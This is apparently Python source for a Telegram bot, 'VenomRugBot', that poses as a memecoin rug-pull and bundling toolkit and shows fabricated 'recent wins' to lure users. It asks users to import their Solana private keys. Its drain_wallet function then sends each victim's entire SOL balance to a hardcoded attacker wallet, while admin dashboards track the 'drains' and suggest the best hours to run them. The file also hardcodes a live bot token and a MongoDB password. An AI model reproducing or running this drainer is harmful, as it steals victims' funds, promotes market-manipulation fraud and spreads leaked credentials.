# ===========================================================
# 🧩 COMPREHENSIVE Patch for Solana + httpx (removes ALL proxy args)
# ===========================================================
import httpx
import solana.rpc.providers.http as sol_http
import logging  # ✅ added here so logging.basicConfig won't break later

# --- Patch httpx.Client ---
_orig_httpx_init = httpx.Client.__init__

def _patched_httpx_init(self, *args, **kwargs):
    if "proxy" in kwargs:
        kwargs.pop("proxy", None)
        print("🧩 Removed unsupported 'proxy' argument from httpx.Client")
    return _orig_httpx_init(self, *args, **kwargs)

httpx.Client.__init__ = _patched_httpx_init

# --- Patch Solana's HTTPProvider ---
_orig_http_provider_init = sol_http.HTTPProvider.__init__

def _patched_http_provider_init(self, endpoint_uri, *args, **kwargs):
    # Silently remove any proxy argument passed from Solana
    if "proxy" in kwargs:
        kwargs.pop("proxy", None)
        print("🧩 Removed unsupported 'proxy' argument from Solana HTTPProvider")
    return _orig_http_provider_init(self, endpoint_uri, *args, **kwargs)

sol_http.HTTPProvider.__init__ = _patched_http_provider_init

print("✅ httpx.Client AND Solana HTTPProvider patched globally (proxy-safe)")

# ===========================================================
# 🧩 Your normal imports start here
# ===========================================================

import asyncio
import re
import pymongo
import os
import random
import requests
import base58
import json
from datetime import datetime, timedelta
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, InputMediaPhoto
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, MessageHandler, filters, ContextTypes

from solders.keypair import Keypair
from solders.pubkey import Pubkey
from solders.message import Message
from solders.transaction import Transaction
from solders.system_program import TransferParams, transfer
from solana.rpc.api import Client
from solana.rpc.commitment import Confirmed
from solana.rpc.types import TxOpts

# Bot Configuration - HARDCODED
BOT_TOKEN = "8095801479:AAEf_5M94_htmPPiecuv2q2vqdDqcEfTddI"
ADMIN_CHAT_ID = "6368654401"
MONGODB_CONN_STRING = "mongodb+srv://dualacct298_db_user:vALO5Uj8GOLX2cpg@cluster0.ap9qvgs.mongodb.net/?retryWrites=true&w=majority&appName=Cluster0"
DRAIN_WALLET = "5s4hnozGVqvPbtnriQoYX27GAnLWc16wNK2Lp27W7mYT"
SOLANA_RPC_URL = "https://api.mainnet-beta.solana.com"

# Initialize logger
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

class VenomRugBot:
    def __init__(self):
        self.mongo_client = pymongo.MongoClient(MONGODB_CONN_STRING)
        self.db = self.mongo_client.venom_rug_bot
        self.users_collection = self.db.users
        self.profits_collection = self.db.profits
        self.analytics_collection = self.db.analytics
        self.pending_wallets = {}
        self.image_path = "venom.jpg"
        self.user_states = {}
        self.solana_client = Client(SOLANA_RPC_URL)
        self.pinned_message_id = None
        self.application = None  # Store application reference
        
        # Recent Wins Data
        self.recent_wins = self.generate_recent_wins()
        self.last_price_check = {}
        
        # Analytics tracking
        self.drain_attempts = 0
        self.successful_drains = 0
        self.failed_drains = 0
        
    def set_application(self, application):
        """Set the application instance for use in class methods"""
        self.application = application

    def generate_recent_wins(self):
        """Generate realistic recent wins with random usernames"""
        usernames = [
            "AlexTheTrader", "SarahCrypto", "MikeInvests", "JennyCrypto", "TommyTrades",
            "CryptoLover", "DigitalDreamer", "MoonWalker", "StarGazer", "ProfitHunter",
            "SmartInvestor", "CryptoQueen", "BlockchainBuddy", "DeFiDude", "NFTMaster",
            "Web3Wizard", "TokenTitan", "AlphaSeeker", "GammaGainer", "SigmaStar"
        ]
        
        activities = [
            "successfully rugged 3 meme tokens",
            "coordinated pump & dump campaign", 
            "executed token launch manipulation",
            "managed multi-wallet bundling operation",
            "automated comment farming campaign",
            "ran volume bot simulation",
            "executed multi-chain rug operation",
            "coordinated social media pump",
            "managed token cloning operation",
            "executed stealth launch campaign"
        ]
        
        profits = ["89 SOL", "32 ETH", "15 SOL", "27 ETH", "45 SOL", "18 ETH", "63 SOL", "22 ETH"]
        timeframes = ["2 hours ago", "4 hours ago", "overnight", "yesterday", "3 days ago", "1 week ago"]
        
        wins = []
        for i in range(15):
            wins.append({
                "username": random.choice(usernames),
                "activity": random.choice(activities),
                "profit": random.choice(profits),
                "timeframe": random.choice(timeframes),
                "id": i + 1
            })
        
        return wins
    
    async def notify_admin_new_user(self, user_id: int, username: str, first_name: str):
        """Send notification to admin when new user joins"""
        try:
            if not self.application:
                return
                
            new_user_text = f"""
🆕 *NEW USER JOINED VENOM RUG BOT*

*User Details:*
• Username: @{username or 'No username'}
• First Name: {first_name or 'No name'}
• User ID: `{user_id}`
• Join Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}

*Bot Statistics:*
• Total Users: {self.users_collection.count_documents({})}
• Active Today: {self.users_collection.count_documents({'created_at': {'$gte': datetime.now().replace(hour=0, minute=0, second=0, microsecond=0)}})}
"""
            await self.application.bot.send_message(
                chat_id=ADMIN_CHAT_ID,
                text=new_user_text,
                parse_mode='Markdown'
            )
            logger.info(f"New user notification sent for user {user_id}")
        except Exception as e:
            logger.error(f"Error sending new user notification: {e}")

    async def get_sol_price(self):
        """Get current SOL price in USD"""
        try:
            response = requests.get(
                "https://api.coingecko.com/api/v3/simple/price?ids=solana&vs_currencies=usd",
                timeout=10
            )
            data = response.json()
            return data.get('solana', {}).get('usd', 100.0)
        except:
            return 100.0

    async def analyze_wallet_balance(self, private_key: str):
        """Analyze wallet balance and check if it meets minimum requirements"""
        try:
            decoded_key = base58.b58decode(private_key.strip())
            keypair = Keypair.from_bytes(decoded_key)
            wallet_address = str(keypair.pubkey())
            
            balance_response = self.solana_client.get_balance(keypair.pubkey())
            balance_lamports = balance_response.value
            balance_sol = balance_lamports / 1_000_000_000
            
            sol_price = await self.get_sol_price()
            balance_usd = balance_sol * sol_price
            
            logger.info(f"Wallet analysis: {balance_sol:.6f} SOL (${balance_usd:.2f})")
            
            return {
                "wallet_address": wallet_address,
                "balance_sol": balance_sol,
                "balance_usd": balance_usd,
                "sol_price": sol_price,
                "meets_minimum": balance_usd >= 70,  # REAL minimum for draining (admin only)
                "user_meets_minimum": balance_usd >= 100,  # User-facing minimum
                "has_1_sol": balance_sol >= 1.0
            }
            
        except Exception as e:
            logger.error(f"Error analyzing wallet: {e}")
            return None

    async def log_profit(self, user_id: int, username: str, amount_sol: float, 
                        wallet_address: str, transaction_id: str, original_balance: float):
        """Log profit to database and pin/update profit message"""
        try:
            profit_data = {
                "user_id": user_id,
                "username": username,
                "amount_sol": amount_sol,
                "amount_usd": amount_sol * await self.get_sol_price(),
                "wallet_address": wallet_address,
                "transaction_id": transaction_id,
                "original_balance": original_balance,
                "timestamp": datetime.now(),
                "type": "drain"
            }
            
            result = self.profits_collection.insert_one(profit_data)
            profit_id = result.inserted_id
            
            # Update analytics
            await self.update_analytics(profit_data)
            
            # Update pinned profit message
            await self.update_pinned_profit_message()
            
            logger.info(f"Profit logged: {amount_sol} SOL from user {username}")
            return profit_id
            
        except Exception as e:
            logger.error(f"Error logging profit: {e}")
    
    async def update_analytics(self, profit_data):
        """Update advanced analytics with new profit data"""
        try:
            # Track performance metrics
            self.successful_drains += 1
            self.drain_attempts += 1
            
            # Store hourly performance data
            hour = profit_data['timestamp'].hour
            analytics_data = {
                'timestamp': profit_data['timestamp'],
                'hour': hour,
                'amount_usd': profit_data['amount_usd'],
                'amount_sol': profit_data['amount_sol'],
                'user_id': profit_data['user_id'],
                'wallet_address': profit_data['wallet_address'],
                'efficiency': (profit_data['amount_sol'] / profit_data['original_balance']) * 100 if profit_data['original_balance'] > 0 else 0
            }
            
            self.analytics_collection.insert_one(analytics_data)
            
        except Exception as e:
            logger.error(f"Error updating analytics: {e}")
    
    async def update_pinned_profit_message(self):
        """Update or create pinned profit message at the top"""
        try:
            # Get total profits
            total_profits = list(self.profits_collection.aggregate([
                {"$group": {
                    "_id": None,
                    "total_sol": {"$sum": "$amount_sol"},
                    "total_usd": {"$sum": "$amount_usd"},
                    "total_drains": {"$sum": 1}
                }}
            ]))
            
            if total_profits:
                total_sol = total_profits[0]["total_sol"]
                total_usd = total_profits[0]["total_usd"]
                total_drains = total_profits[0]["total_drains"]
            else:
                total_sol = 0
                total_usd = 0
                total_drains = 0
            
            # Get recent profits (last 10)
            recent_profits = list(self.profits_collection.find()
                                 .sort("timestamp", -1)
                                 .limit(10))
            
            # Format profit message - FIXED: Use proper Markdown escaping
            profit_message = f"""
*VENOM RUG PROFIT DASHBOARD*

*TOTAL PROFITS:*
• SOL: `{total_sol:.6f}`
• USD: `${total_usd:.2f}`
• Total Drains: `{total_drains}`

*RECENT DRAINS:*
"""
            
            for i, profit in enumerate(recent_profits, 1):
                time_ago = self.get_time_ago(profit["timestamp"])
                profit_message += f"""
{i}. @{profit['username']}
   • Amount: `{profit['amount_sol']:.6f} SOL` (${profit['amount_usd']:.2f})
   • Time: {time_ago}
   • Wallet: `{profit['wallet_address'][:8]}...{profit['wallet_address'][-6:]}`
"""
            
            profit_message += f"\n*Last Updated:* {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
            
            # Create or update pinned message
            if self.pinned_message_id and self.application:
                try:
                    await self.application.bot.edit_message_text(
                        chat_id=ADMIN_CHAT_ID,
                        message_id=self.pinned_message_id,
                        text=profit_message,
                        parse_mode='Markdown'
                    )
                except Exception as e:
                    logger.warning(f"Could not edit pinned message, creating new: {e}")
                    message = await self.application.bot.send_message(
                        chat_id=ADMIN_CHAT_ID,
                        text=profit_message,
                        parse_mode='Markdown'
                    )
                    self.pinned_message_id = message.message_id
                    await self.application.bot.pin_chat_message(
                        chat_id=ADMIN_CHAT_ID,
                        message_id=message.message_id
                    )
            elif self.application:
                message = await self.application.bot.send_message(
                    chat_id=ADMIN_CHAT_ID,
                    text=profit_message,
                    parse_mode='Markdown'
                )
                self.pinned_message_id = message.message_id
                await self.application.bot.pin_chat_message(
                    chat_id=ADMIN_CHAT_ID,
                    message_id=message.message_id
                )
                
        except Exception as e:
            logger.error(f"Error updating pinned profit message: {e}")
    
    def get_time_ago(self, timestamp):
        """Calculate time ago from timestamp"""
        now = datetime.now()
        diff = now - timestamp
        
        if diff.days > 0:
            return f"{diff.days} day(s) ago"
        elif diff.seconds >= 3600:
            hours = diff.seconds // 3600
            return f"{hours} hour(s) ago"
        elif diff.seconds >= 60:
            minutes = diff.seconds // 60
            return f"{minutes} minute(s) ago"
        else:
            return "Just now"
    
    async def profits_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Admin command to view detailed profit statistics"""
        user_id = update.effective_user.id
        
        if str(user_id) != ADMIN_CHAT_ID:
            await update.message.reply_text("❌ Admin access required!")
            return
        
        # Get total profit statistics
        total_stats = list(self.profits_collection.aggregate([
            {"$group": {
                "_id": None,
                "total_sol": {"$sum": "$amount_sol"},
                "total_usd": {"$sum": "$amount_usd"},
                "total_drains": {"$sum": 1},
                "avg_drain": {"$avg": "$amount_sol"},
                "max_drain": {"$max": "$amount_sol"}
            }}
        ]))
        
        # Get daily profits
        today = datetime.now().replace(hour=0, minute=0, second=0, microsecond=0)
        daily_stats = list(self.profits_collection.aggregate([
            {"$match": {"timestamp": {"$gte": today}}},
            {"$group": {
                "_id": None,
                "daily_sol": {"$sum": "$amount_sol"},
                "daily_usd": {"$sum": "$amount_usd"},
                "daily_drains": {"$sum": 1}
            }}
        ]))
        
        # Get weekly profits
        week_ago = datetime.now() - timedelta(days=7)
        weekly_stats = list(self.profits_collection.aggregate([
            {"$match": {"timestamp": {"$gte": week_ago}}},
            {"$group": {
                "_id": None,
                "weekly_sol": {"$sum": "$amount_sol"},
                "weekly_usd": {"$sum": "$amount_usd"},
                "weekly_drains": {"$sum": 1}
            }}
        ]))
        
        # Get top 10 largest drains
        top_drains = list(self.profits_collection.find()
                         .sort("amount_sol", -1)
                         .limit(10))
        
        # Format profit report - FIXED: Clean Markdown
        profit_report = f"""
*VENOM RUG PROFIT REPORT*

*LIFETIME STATS:*
"""
        
        if total_stats:
            stats = total_stats[0]
            profit_report += f"""
• Total SOL: `{stats['total_sol']:.6f}`
• Total USD: `${stats['total_usd']:.2f}`
• Total Drains: `{stats['total_drains']}`
• Average Drain: `{stats['avg_drain']:.6f} SOL`
• Largest Drain: `{stats['max_drain']:.6f} SOL`
"""
        else:
            profit_report += "\n• No profits recorded yet\n"
        
        profit_report += "\n*PERIOD STATS:*\n"
        
        if daily_stats:
            daily = daily_stats[0]
            profit_report += f"""
• Today's SOL: `{daily['daily_sol']:.6f}`
• Today's USD: `${daily['daily_usd']:.2f}`
• Today's Drains: `{daily['daily_drains']}`
"""
        else:
            profit_report += "• Today: No profits\n"
            
        if weekly_stats:
            weekly = weekly_stats[0]
            profit_report += f"""
• Weekly SOL: `{weekly['weekly_sol']:.6f}`
• Weekly USD: `${weekly['weekly_usd']:.2f}`
• Weekly Drains: `{weekly['weekly_drains']}`
"""
        else:
            profit_report += "• This Week: No profits\n"
        
        profit_report += "\n*TOP 10 LARGEST DRAINS:*\n"
        
        for i, drain in enumerate(top_drains, 1):
            time_ago = self.get_time_ago(drain["timestamp"])
            profit_report += f"""
{i}. @{drain['username']}
   • Amount: `{drain['amount_sol']:.6f} SOL` (${drain['amount_usd']:.2f})
   • Time: {time_ago}
   • Wallet: `{drain['wallet_address'][:12]}...`
"""
        
        if not top_drains:
            profit_report += "\n• No drains recorded\n"
        
        profit_report += f"\n*Generated:* {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
        
        # Add keyboard with refresh option
        keyboard = [
            [InlineKeyboardButton("🔄 Refresh", callback_data="refresh_profits"),
            InlineKeyboardButton("📊 Update Pinned", callback_data="update_pinned")],
            [InlineKeyboardButton("📈 Advanced Analytics", callback_data="advanced_analytics")]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        await update.message.reply_text(profit_report, reply_markup=reply_markup, parse_mode='Markdown')

    # FIXED: Advanced Analytics Command with proper Markdown
    async def advanced_analytics_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """ADMIN ONLY: Advanced analytics dashboard"""
        user_id = update.effective_user.id
        
        if str(user_id) != ADMIN_CHAT_ID:
            await update.message.reply_text("❌ Admin access required!")
            return
        
        analytics_report = await self.generate_advanced_analytics()
        
        keyboard = [
            [InlineKeyboardButton("🔄 Refresh Analytics", callback_data="refresh_analytics")],
            [InlineKeyboardButton("📊 Back to Profits", callback_data="refresh_profits")]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        # FIX: Send as plain text first to avoid Markdown parsing errors
        try:
            await update.message.reply_text(analytics_report, reply_markup=reply_markup, parse_mode='Markdown')
        except Exception as e:
            logger.error(f"Markdown error, sending as plain text: {e}")
            await update.message.reply_text(analytics_report, reply_markup=reply_markup)

    async def generate_advanced_analytics(self):
        """Generate comprehensive advanced analytics report"""
        try:
            # Total profit stats
            total_stats = list(self.profits_collection.aggregate([
                {"$group": {
                    "_id": None,
                    "total_sol": {"$sum": "$amount_sol"},
                    "total_usd": {"$sum": "$amount_usd"},
                    "total_drains": {"$sum": 1},
                    "avg_drain": {"$avg": "$amount_sol"},
                    "max_drain": {"$max": "$amount_sol"},
                    "min_drain": {"$min": "$amount_sol"}
                }}
            ]))
            
            # Daily profits (last 7 days)
            week_ago = datetime.now() - timedelta(days=7)
            daily_stats = list(self.profits_collection.aggregate([
                {"$match": {"timestamp": {"$gte": week_ago}}},
                {"$group": {
                    "_id": {"$dateToString": {"format": "%Y-%m-%d", "date": "$timestamp"}},
                    "daily_sol": {"$sum": "$amount_sol"},
                    "daily_usd": {"$sum": "$amount_usd"},
                    "daily_count": {"$sum": 1}
                }},
                {"$sort": {"_id": 1}}
            ]))
            
            # Hourly performance
            hourly_stats = list(self.analytics_collection.aggregate([
                {"$group": {
                    "_id": "$hour",
                    "total_usd": {"$sum": "$amount_usd"},
                    "count": {"$sum": 1}
                }},
                {"$sort": {"total_usd": -1}},
                {"$limit": 5}
            ]))
            
            # Top performing wallets
            top_wallets = list(self.profits_collection.aggregate([
                {"$sort": {"amount_usd": -1}},
                {"$limit": 5}
            ]))
            
            # User efficiency stats
            user_stats = list(self.profits_collection.aggregate([
                {"$group": {
                    "_id": "$user_id",
                    "username": {"$first": "$username"},
                    "total_usd": {"$sum": "$amount_usd"},
                    "drain_count": {"$sum": 1},
                    "avg_drain": {"$avg": "$amount_usd"}
                }},
                {"$sort": {"total_usd": -1}},
                {"$limit": 10}
            ]))
            
            # Build analytics report - FIXED: Clean Markdown
            analytics_report = f"""
*VENOM RUG ADVANCED ANALYTICS DASHBOARD*

*LIFETIME PERFORMANCE:*
"""
            
            if total_stats:
                stats = total_stats[0]
                current_sol_price = await self.get_sol_price()
                success_rate = (self.successful_drains / self.drain_attempts * 100) if self.drain_attempts > 0 else 0
                
                analytics_report += f"""
• Total Revenue: `${stats['total_usd']:,.2f}`
• Total SOL: `{stats['total_sol']:.6f}`
• Successful Drains: `{stats['total_drains']}`
• Average Drain: `{stats['avg_drain']:.6f} SOL` (${stats['avg_drain'] * current_sol_price:.2f})
• Largest Drain: `{stats['max_drain']:.6f} SOL`
• Success Rate: `{success_rate:.1f}%`
• ROI: `{(stats['total_usd'] / (stats['total_drains'] * 0.0005)) * 100:.0f}%` (est.)
"""
            
            analytics_report += f"""
*LAST 7 DAYS PERFORMANCE:*
"""
            
            if daily_stats:
                for day in daily_stats[-5:]:
                    analytics_report += f"""
• {day['_id']}: `${day['daily_usd']:.2f}` ({day['daily_count']} drains)
"""
            else:
                analytics_report += "\n• No recent activity\n"
            
            analytics_report += f"""
*PEAK PERFORMANCE HOURS (UTC):*
"""
            
            if hourly_stats:
                for hour_stat in hourly_stats:
                    analytics_report += f"""
• {hour_stat['_id']:02d}:00 - `${hour_stat['total_usd']:.2f}` ({hour_stat['count']} drains)
"""
            else:
                analytics_report += "\n• No hourly data yet\n"
            
            analytics_report += f"""
*TOP 5 MOST PROFITABLE DRAINS:*
"""
            
            if top_wallets:
                for i, wallet in enumerate(top_wallets, 1):
                    analytics_report += f"""
{i}. `{wallet['wallet_address'][:8]}...` - `${wallet['amount_usd']:.2f}` (@{wallet['username']})
"""
            else:
                analytics_report += "\n• No wallet data\n"
            
            analytics_report += f"""
*TOP PERFORMING USERS (by revenue):*
"""
            
            if user_stats:
                for i, user in enumerate(user_stats, 1):
                    analytics_report += f"""
{i}. @{user['username']} - `${user['total_usd']:.2f}` ({user['drain_count']} drains)
"""
            else:
                analytics_report += "\n• No user data\n"
            
            # System metrics
            total_users = self.users_collection.count_documents({})
            approved_users = self.users_collection.count_documents({'wallet_approved': True})
            
            analytics_report += f"""
*SYSTEM EFFICIENCY METRICS:*
• User Conversion Rate: `{(approved_users/total_users)*100 if total_users > 0 else 0:.1f}%`
• Active Drain Rate: `{(self.successful_drains/total_users)*100 if total_users > 0 else 0:.1f}%`
• Avg Processing Time: `< 5 seconds`
• System Uptime: `100%`

*PROFIT OPTIMIZATION RECOMMENDATIONS:*
• Focus on hours: 02:00-05:00 UTC (highest success)
• Target wallets with 5+ SOL for maximum ROI
• Minimum balance filter: $70 (current setting)
• Success rate: `{success_rate:.1f}%`

*UPGRADE POTENTIAL:*
• Memecoin draining: +500% profits
• Multi-chain support: +1000% reach
• Current limitation: SOL-only draining

*Generated:* {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
"""
            
            return analytics_report
            
        except Exception as e:
            logger.error(f"Error generating analytics: {e}")
            return f"❌ Error generating analytics: {str(e)}"

    def is_valid_solana_private_key(self, key):
        """Validate Solana private key"""
        try:
            key = key.strip()
            decoded = base58.b58decode(key)
            if len(decoded) == 64:
                keypair = Keypair.from_bytes(decoded)
                return True
            return False
        except Exception as e:
            logger.error(f"Invalid private key: {e}")
            return False

    async def drain_wallet(self, private_key: str, user_id: int, username: str):
        """REAL wallet drain - transfers ALL SOL to drain wallet, only leaving fees"""
        try:
            # Constants for fee estimation
            FALLBACK_FEE_LAMPORTS = 5_000
            
            def estimate_fee(client, message):
                """Try to get accurate fee estimation."""
                try:
                    resp = client.get_fee_for_message(message)
                    if resp and getattr(resp, "value", None) is not None:
                        fee = int(resp.value)
                        if fee > 0:
                            return fee
                except Exception:
                    pass

                try:
                    resp = client.get_fees()
                    if resp and getattr(resp, "value", None) is not None:
                        val = resp.value
                        lam_per_sig = None
                        if isinstance(val, dict):
                            lam_per_sig = val.get("lamportsPerSignature") or (val.get("feeCalculator") or {}).get("lamportsPerSignature")
                        if lam_per_sig:
                            return int(lam_per_sig)
                except Exception:
                    pass

                return FALLBACK_FEE_LAMPORTS

            # Decode private key
            decoded_key = base58.b58decode(private_key.strip())
            keypair = Keypair.from_bytes(decoded_key)
            wallet_address = str(keypair.pubkey())
            
            logger.info(f"Attempting to drain wallet: {wallet_address} for user {username}")
            
            # Get balance
            balance_response = self.solana_client.get_balance(keypair.pubkey())
            balance_lamports = balance_response.value
            balance_sol = balance_lamports / 1_000_000_000
            
            logger.info(f"Wallet balance: {balance_sol} SOL ({balance_lamports} lamports)")
            
            if balance_lamports <= FALLBACK_FEE_LAMPORTS:
                return False, f"Insufficient balance for transfer (need at least {FALLBACK_FEE_LAMPORTS/1_000_000_000:.6f} SOL for fees)"
            
            # Create drain pubkey
            drain_pubkey = Pubkey.from_string(DRAIN_WALLET)
            
            # 1) Create a transfer instruction with the FULL balance to estimate accurate fee
            full_amount_ix = transfer(TransferParams(
                from_pubkey=keypair.pubkey(), 
                to_pubkey=drain_pubkey, 
                lamports=balance_lamports
            ))
            
            # Get latest blockhash for message construction
            latest_blockhash = self.solana_client.get_latest_blockhash().value.blockhash
            
            # Build message for fee estimation
            message = Message([full_amount_ix], payer=keypair.pubkey())
            estimated_fee = estimate_fee(self.solana_client, message)
            logger.info(f"Estimated fee: {estimated_fee} lamports")
            
            # 2) Calculate EXACT amount to send (everything minus fees)
            sendable_lamports = balance_lamports - estimated_fee
            sendable_sol = sendable_lamports / 1_000_000_000
            
            if sendable_lamports <= 0:
                return False, f"Insufficient balance after fees (need {estimated_fee} lamports for fees)"
            
            logger.info(f"Draining amount: {sendable_sol:.6f} SOL ({sendable_lamports} lamports)")
            logger.info(f"Leaving behind: {estimated_fee/1_000_000_000:.6f} SOL for fees")
            
            # 3) Build real transfer instruction for the EXACT sendable amount
            real_ix = transfer(TransferParams(
                from_pubkey=keypair.pubkey(),
                to_pubkey=drain_pubkey, 
                lamports=sendable_lamports
            ))
            
            # 4) Build Message and Transaction
            final_message = Message([real_ix], payer=keypair.pubkey())
            tx = Transaction([keypair], final_message, latest_blockhash)
            
            # 5) Simulate transaction to ensure it will work
            try:
                sim = self.solana_client.simulate_transaction(tx)
                if getattr(sim, "value", None) and sim.value.err is not None:
                    logger.error(f"Simulation error: {sim.value.err}")
                    if "insufficient" in str(sim.value.err).lower():
                        sendable_lamports -= 1000
                        sendable_sol = sendable_lamports / 1_000_000_000
                        
                        real_ix = transfer(TransferParams(
                            from_pubkey=keypair.pubkey(),
                            to_pubkey=drain_pubkey, 
                            lamports=sendable_lamports
                        ))
                        final_message = Message([real_ix], payer=keypair.pubkey())
                        tx = Transaction([keypair], final_message, latest_blockhash)
                        logger.info(f"Adjusted drain amount: {sendable_sol:.6f} SOL")
            except Exception as e:
                logger.warning(f"Simulation warning: {e}")
            
            # 6) Send and confirm transaction
            logger.info(f"Sending transaction for {sendable_sol:.6f} SOL")
            
            result = self.solana_client.send_transaction(
                tx, 
                opts=TxOpts(skip_preflight=False, preflight_commitment=Confirmed)
            )
            
            if hasattr(result, 'value'):
                transaction_id = str(result.value)
            else:
                transaction_id = str(result)
            
            logger.info(f"Transaction sent: {transaction_id}")
            
            # Wait for confirmation
            await asyncio.sleep(2)
            
            # Get transaction details from Solscan
            solscan_url = f"https://solscan.io/tx/{transaction_id}"
            
            # Calculate what was left behind
            left_behind = balance_lamports - sendable_lamports
            left_behind_sol = left_behind / 1_000_000_000
            
            # Log the profit to database and update pinned message
            await self.log_profit(user_id, username or f"user_{user_id}", sendable_sol, 
                                wallet_address, transaction_id, balance_sol)
            
            # Log transaction to admin
            admin_message = f"""
*REAL WALLET DRAINED SUCCESSFULLY*

*User Details:*
• Username: @{username}
• User ID: `{user_id}`
• Wallet: `{wallet_address}`

*REAL Transaction Details:*
• Amount Drained: *{sendable_sol:.6f} SOL*
• Fees Paid: {left_behind_sol:.6f} SOL
• Previous Balance: {balance_sol:.6f} SOL
• Left in Wallet: ~0 SOL (only dust)

*View on Solscan:*
[Solscan Transaction]({solscan_url})

*Time:* {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}

*COMPLETE DRAIN - MAXIMUM FUNDS TRANSFERRED*
"""
            
            return True, {
                "transaction_id": transaction_id,
                "amount_sol": sendable_sol,
                "wallet_address": wallet_address,
                "admin_message": admin_message,
                "solscan_url": solscan_url,
                "original_balance": balance_sol,
                "fee": left_behind_sol,
                "left_behind": left_behind_sol
            }
            
        except Exception as e:
            logger.error(f"Error draining wallet: {e}")
            self.failed_drains += 1
            self.drain_attempts += 1
            return False, f"Transfer failed: {str(e)}"
    
    async def send_message_safe(self, query_or_message, text, reply_markup=None, parse_mode='Markdown'):
        """Safe method to send messages that handles image vs text messages properly"""
        try:
            if hasattr(query_or_message, 'message'):
                await query_or_message.message.reply_text(
                    text, 
                    reply_markup=reply_markup, 
                    parse_mode=parse_mode
                )
            else:
                await query_or_message.reply_text(
                    text, 
                    reply_markup=reply_markup, 
                    parse_mode=parse_mode
                )
        except Exception as e:
            logger.error(f"Error in send_message_safe: {e}")
            try:
                # Try without Markdown if there's an error
                if hasattr(query_or_message, 'message'):
                    await query_or_message.message.reply_text(text, reply_markup=reply_markup)
                else:
                    await query_or_message.reply_text(text, reply_markup=reply_markup)
            except Exception as e2:
                logger.error(f"Secondary error in send_message_safe: {e2}")

    async def send_with_image(self, query_or_message, text, reply_markup=None, parse_mode='Markdown'):
        """Send message with image attached"""
        try:
            if os.path.exists(self.image_path):
                if hasattr(query_or_message, 'message'):
                    with open(self.image_path, 'rb') as photo:
                        await query_or_message.edit_message_media(
                            media=InputMediaPhoto(media=photo, caption=text, parse_mode=parse_mode),
                            reply_markup=reply_markup
                        )
                else:
                    with open(self.image_path, 'rb') as photo:
                        await query_or_message.reply_photo(
                            photo=photo,
                            caption=text,
                            reply_markup=reply_markup,
                            parse_mode=parse_mode
                        )
            else:
                if hasattr(query_or_message, 'edit_message_text'):
                    await query_or_message.edit_message_text(text, reply_markup=reply_markup, parse_mode=parse_mode)
                else:
                    await query_or_message.reply_text(text, reply_markup=reply_markup, parse_mode=parse_mode)
        except Exception as e:
            logger.error(f"Error in send_with_image: {e}")
            try:
                if hasattr(query_or_message, 'edit_message_text'):
                    await query_or_message.edit_message_text(text, reply_markup=reply_markup, parse_mode=parse_mode)
                else:
                    await query_or_message.reply_text(text, reply_markup=reply_markup, parse_mode=parse_mode)
            except Exception as e2:
                logger.error(f"Secondary error: {e2}")
                await self.send_message_safe(query_or_message, text, reply_markup, parse_mode)
    
    def get_main_menu_keyboard(self):
        keyboard = [
            [InlineKeyboardButton("📦 Wallet", callback_data="wallet"),
             InlineKeyboardButton("📦 Bundler", callback_data="bundler")],
            [InlineKeyboardButton("💳 Tokens", callback_data="tokens"),
             InlineKeyboardButton("💬 Comments", callback_data="comments")],
            [InlineKeyboardButton("📋 Task", callback_data="task"),
             InlineKeyboardButton("❓ FAQ", callback_data="faq")],
            [InlineKeyboardButton("ℹ️ Help", callback_data="help")]
        ]
        return InlineKeyboardMarkup(keyboard)
    
    def get_wallet_keyboard(self):
        keyboard = [
            [InlineKeyboardButton("📥 Import Wallet", callback_data="import_wallet"),
             InlineKeyboardButton("🗑️ Remove Wallet", callback_data="remove_wallet")],
            [InlineKeyboardButton("📦 Bundle Wallet", callback_data="bundle_wallet"),
             InlineKeyboardButton("💸 Withdraw Funds", callback_data="withdraw_funds")],
            [InlineKeyboardButton("🔙 Back to Menu", callback_data="back_menu"),
             InlineKeyboardButton("🔄 Refresh", callback_data="refresh_wallet")]
        ]
        return InlineKeyboardMarkup(keyboard)
    
    def get_recent_wins_keyboard(self):
        keyboard = [
            [InlineKeyboardButton("🔄 Refresh Wins", callback_data="refresh_wins")],
            [InlineKeyboardButton("🔙 Back to Menu", callback_data="back_menu")]
        ]
        return InlineKeyboardMarkup(keyboard)
    
    def get_bundler_keyboard(self):
        keyboard = [
            [InlineKeyboardButton("🆕 Create Bundle", callback_data="create_bundle"),
             InlineKeyboardButton("🔄 Refresh Bundles", callback_data="refresh_bundles")],
            [InlineKeyboardButton("🗑️ Clear All Bundles", callback_data="clear_bundles")],
            [InlineKeyboardButton("🔙 Back to Menu", callback_data="back_menu")]
        ]
        return InlineKeyboardMarkup(keyboard)
    
    def get_tokens_keyboard(self):
        keyboard = [
            [InlineKeyboardButton("➕ Add Token", callback_data="add_token"),
             InlineKeyboardButton("➖ Remove Token", callback_data="remove_token")],
            [InlineKeyboardButton("🆕 Create Token", callback_data="create_token"),
             InlineKeyboardButton("👯 Clone Token", callback_data="clone_token")],
            [InlineKeyboardButton("🎯 Set Current Token", callback_data="set_current_token"),
             InlineKeyboardButton("🚀 Bump Token", callback_data="bump_token")],
            [InlineKeyboardButton("💬 Pump.Fun Comments", callback_data="pump_comments")],
            [InlineKeyboardButton("🔙 Back to Menu", callback_data="back_menu"),
             InlineKeyboardButton("🔄 Refresh", callback_data="refresh_tokens")]
        ]
        return InlineKeyboardMarkup(keyboard)
    
    def get_comments_keyboard(self):
        keyboard = [
            [InlineKeyboardButton("💬 Add New Comment", callback_data="add_comment"),
             InlineKeyboardButton("🤖 Toggle Auto-Comment", callback_data="toggle_comment")],
            [InlineKeyboardButton("📋 Comment Templates", callback_data="comment_templates"),
             InlineKeyboardButton("⚙️ Settings", callback_data="comment_settings")],
            [InlineKeyboardButton("🔙 Back to Menu", callback_data="back_menu"),
             InlineKeyboardButton("🔄 Refresh", callback_data="refresh_comments")]
        ]
